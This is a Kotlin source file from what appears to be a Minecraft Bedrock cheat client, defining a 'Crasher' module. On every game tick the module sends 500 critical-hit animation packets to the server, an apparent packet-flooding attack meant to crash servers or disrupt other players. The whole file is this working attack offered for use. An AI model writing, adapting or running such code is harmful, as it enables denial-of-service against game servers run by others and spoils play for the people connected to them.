package dev.sora.relay.cheat.module.impl

import com.nukkitx.protocol.bedrock.packet.AnimatePacket
import dev.sora.relay.cheat.module.CheatModule
import dev.sora.relay.game.event.Listen
import dev.sora.relay.game.event.impl.EventTick

class ModuleCrasher : CheatModule("Crasher") {

    @Listen
    fun onTick(event: EventTick) {
        val netSession = event.session.netSession
        val packet = AnimatePacket().apply {
            action = AnimatePacket.Action.CRITICAL_HIT
            runtimeEntityId = event.session.thePlayer.entityId
        }
        repeat(500) {
            netSession.outboundPacket(packet)
        }
    }
}